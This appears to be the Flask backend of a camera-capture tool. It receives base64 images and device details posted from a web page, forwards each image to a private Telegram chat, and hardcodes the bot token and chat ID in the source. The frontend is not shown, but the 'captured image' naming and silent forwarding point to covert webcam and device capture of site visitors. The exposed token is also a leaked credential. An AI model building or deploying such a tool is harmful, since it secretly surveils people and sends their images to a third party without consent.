from flask import Flask, render_template, request, jsonify
import os
import base64
import requests
from io import BytesIO

app = Flask(__name__)

# Telegram Bot details
TELEGRAM_TOKEN = "7613835920:AAHrUPH7VHA-NZLfFwTAgX13xU8NvQIVZ78"
TELEGRAM_CHAT_ID = "912211827"

# Set up a folder for storing captured images (optional)
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/submit_data', methods=['POST'])
def submit_data():
    data = request.get_json()  # Get JSON data from the frontend
    device_info = data.get('device_info')
    image_data = data.get('image_data')

    if image_data:
        try:
            # Decode the base64 image data
            img_data = base64.b64decode(image_data)
            
            # Send the image to the Telegram bot
            send_image_to_telegram(img_data)
            print("Image sent to Telegram bot.")

        except Exception as e:
            return jsonify({"message": "Error processing the image", "error": str(e)}), 500
    
    # Process or save the device_info (e.g., log to a file)
    if device_info:
        print("Device Info:", device_info)

    return jsonify({"message": "Data received successfully!"})

def send_image_to_telegram(image_data):
    """Send the captured image to the Telegram bot."""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
    
    # Prepare the image to be sent as a file-like object
    image_file = BytesIO(image_data)
    image_file.name = "captured_image.png"  # Set a name for the file
    
    files = {'photo': image_file}
    data = {'chat_id': TELEGRAM_CHAT_ID}
    
    # Send the request to the Telegram Bot API
    response = requests.post(url, data=data, files=files)

    if not response.ok:
        raise Exception(f"Error sending image to Telegram: {response.text}")

if __name__ == "__main__":
    app.run(debug=True)
